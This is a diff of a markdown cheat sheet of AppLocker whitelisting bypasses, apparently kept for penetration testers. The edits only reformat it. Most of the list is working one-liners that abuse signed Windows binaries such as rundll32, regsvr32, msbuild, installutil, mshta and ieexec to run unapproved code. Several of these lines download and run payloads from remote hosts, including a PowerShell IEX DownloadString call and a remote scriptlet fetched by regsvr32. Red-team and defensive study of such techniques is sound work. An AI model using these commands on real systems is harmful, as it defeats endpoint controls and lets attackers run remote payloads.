@@ -4,32 +4,31 @@ These bypass techniques are based on the "Create Default Rules" in AppLocker.
 Please contribute and do point out errors or resources I have forgotten.
 
 
-1. **Rundll32.exe**
+## 1. Rundll32.exe
 
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"
 
 rundll32 shell32.dll,Control_RunDLL payload.dll
 
-Links:
+Links:  
 https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/
 https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7
 
 
-
-2. **Regsvr32.exe**
+## 2. Regsvr32.exe
 
 regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
 
-Links:
+Links:  
 https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302
 
 
 
-3. **Msbuild.exe**
+## 3. Msbuild.exe
 
 msbuild.exe pshell.xml
 
-Links:
+Links:  
 https://gist.github.com/subTee/6b236083da2fd6ddff216e434f257614
 http://subt0x10.blogspot.no/2017/04/bypassing-application-whitelisting.html
 https://github.com/Cn33liz/MSBuildShell
@@ -39,116 +38,116 @@ https://www.youtube.com/watch?v=aSDEAPXaz28
 
 
 
-4. **Regsvcs.exe**
+## 4. Regsvcs.exe
 
 regsvcs.exe /U regsvcs.dll
 regsvcs.exe regsvcs.dll
 
-Links:
+Links:  
 https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/
 https://gist.githubusercontent.com/subTee/fb09ef511e592e6f7993/raw/e9b28e7955a5646672267a61e9685fc5a4ab5f2a/regsvcs.cs
 
 
 
-5. **Regasm.exe**
+## 5. Regasm.exe
 
 regasm.exe /U regsvcs.dll
 regasm.exe regsvcs.dll
 
-Links:
+Links:  
 https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/
 https://gist.githubusercontent.com/subTee/fb09ef511e592e6f7993/raw/e9b28e7955a5646672267a61e9685fc5a4ab5f2a/regsvcs.cs
 
 
 
-6. **Bginfo.exe**
+## 6. Bginfo.exe
 
 bginfo.exe bginfo.bgi /popup /nolicprompt
 
-Links:
+Links:  
 https://msitpros.com/?p=3831
 https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/
 https://msitpros.com/?p=3860
 
 
 
-7. **InstallUtil.exe**
+## 7. InstallUtil.exe
 
 InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
 
-Links:
+Links:  
 https://github.com/subTee/AllTheThings
 https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/
 https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12
 
 
 
-8. **MSDT.exe**
+## 8. MSDT.exe
 
 Open .diagcab package
 
-Links:
+Links:  
 https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/
 
 
 
-9. **mshta.exe**
+## 9. mshta.exe
 
 mshta.exe evilfile.hta
 
-Links:
+Links:  
 https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4
 
 
 
-10. **Execute .Bat**
+## 10. Execute .Bat
 
 cmd.exe /k < script.txt
 
-Links:
+Links:  
 https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3
 
 
 
-11. **Execute .PS1**
+## 11. Execute .PS1
 
 Get-Content script.txt | iex
 
-Links:
+Links:  
 https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3
 
 
 
-12. **Execute .VBS**
+## 12. Execute .VBS
 
 cscript.exe //E:vbscript script.txt
 
-Links:
+Links:  
 https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3
 
 
 
-13. **PresentationHost.exe**
+## 13. PresentationHost.exe
 
 Missing Example
 
-Links:
+Links:  
 https://raw.githubusercontent.com/subTee/ShmooCon-2015/master/ShmooCon-2015-Simple-WLEvasion.pdf
 
 
 
-14. **dfsvc.exe**
+## 14. dfsvc.exe
 
 Missing Example
 
-Links:
+Links:  
 https://raw.githubusercontent.com/subTee/ShmooCon-2015/master/ShmooCon-2015-Simple-WLEvasion.pdf
 
 
 
-15. **IEExec.exe**
+## 15. IEExec.exe
 
 ieexec.exe http://x.x.x.x:8080/bypass.exe
 
-Links:
+Links:  
 https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/
